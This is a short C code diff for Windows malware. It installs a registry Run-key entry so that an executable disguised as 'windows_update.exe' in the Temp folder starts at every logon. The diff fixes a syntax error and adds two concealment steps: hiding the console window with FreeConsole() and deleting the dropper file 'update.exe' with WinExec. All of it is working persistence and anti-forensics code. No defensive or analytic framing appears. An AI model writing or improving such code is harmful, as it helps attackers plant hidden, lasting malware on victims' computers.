@@ -15,13 +15,15 @@ int persistence(const char *reg_key, const char *value){
         RegCloseKey(key);
         return -1;
     }  
-    rc = RegCloseKey(key)
+    rc = RegCloseKey(key);
     if(ERROR_SUCCESS != rc){
         printf("RegCloseKey failed: %u\n", GetLastError());
         return -1;
     }
+    WinExec("del update.exe", 0);
     return 0;
 }
 int main(){
+    FreeConsole();
     persistence("Software\\Microsoft\\Windows\\CurrentVersion\\Run","C:\\Windows\\Temp\\windows_update.exe");
 }
